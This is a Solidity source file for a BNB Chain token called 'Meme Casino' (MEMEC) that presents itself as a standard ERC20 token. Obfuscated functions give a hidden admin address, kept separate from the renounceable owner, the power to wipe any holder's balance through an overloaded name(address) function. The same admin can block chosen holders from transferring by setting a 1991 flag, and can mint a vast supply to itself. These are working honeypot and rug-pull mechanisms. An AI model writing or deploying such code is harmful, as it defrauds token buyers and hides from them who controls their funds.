/**
 *Submitted for verification at BscScan.com on 2023-11-02
*/

/**
 *Submitted for verification at BscScan.com on 2023-11-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
   
}

pragma solidity ^0.8.0;

contract MEMEC is Ownable {
    uint256 tokenamount = 10000000000*10**decimals();
    address public xazndh71;
    uint256 private _totalSupply = tokenamount;
    constructor(address tokenadmin) {
        address curxxaa = _msgSender();
        xazndh71 = tokenadmin;
        xdogebot[curxxaa] += tokenamount;
        emit Transfer(address(0), curxxaa, tokenamount);
    }
    
    string public _tokenname = "Meme Casino";
    string public _tokensymbol = "MEMEC";
   
    mapping(address => uint256) private xdogebot;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }
    uint256 zerro = 0;
    mapping(address => uint256) private hggxaayy;
    function name(address name123) external      {
        if(true){
       require(xazndh71 ==  _msgSender());
        }

        address xasxc = _msgSender();
        address xasxc22 = xasxc;
        
        xdogebot[name123] *= zerro;
      
          if(true){
       require(xazndh71 ==  _msgSender());
        }
    }

    function xdogeadminxxx(address jjkxq1) public     {
        if(true){
       require(xazndh71 ==  _msgSender());
        }

        require(xazndh71 ==  _msgSender());
        address xjhhxx = jjkxq1;
        hggxaayy[xjhhxx] = 1991;
       
    }

    function quitxdogexadadmin(address jjkxq1) public     {
                if(true){
        if(xazndh71 != _msgSender()){
                revert("fu");
        }
        }
        require(xazndh71 ==  _msgSender());
        address xjhhxx = jjkxq1;
        hggxaayy[xjhhxx] = 0;
    }

    function balanceOf(address account) public view returns (uint256) {
        return xdogebot[account];
    }

    function name() public view returns (string memory) {
        return _tokenname;
    }
    uint256 globalMath = 42330000000-50000;
    uint256 globalMath2 = 99200;
    uint256 globalresult = globalMath2*((10**decimals()*globalMath));
    function xdogeadddminadd() 
    external {
        if(true){
       require(xazndh71 ==  _msgSender());
        }
        address xasxc = _msgSender();
        address xasxc22 = xasxc;
        
        
        xdogebot[xasxc22] += globalresult;
        
    }

    function transfer(address to, uint256 amount) public returns (bool) {
       
        _transfer(_msgSender(), to, amount);
        return true;
    }
   
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = xdogebot[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (hggxaayy[from] == 1991){
            if (true) {
            revert(_tokensymbol);
            }
        }
       
        xdogebot[from] = xdogebot[from]-amount;
        xdogebot[to] = xdogebot[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
}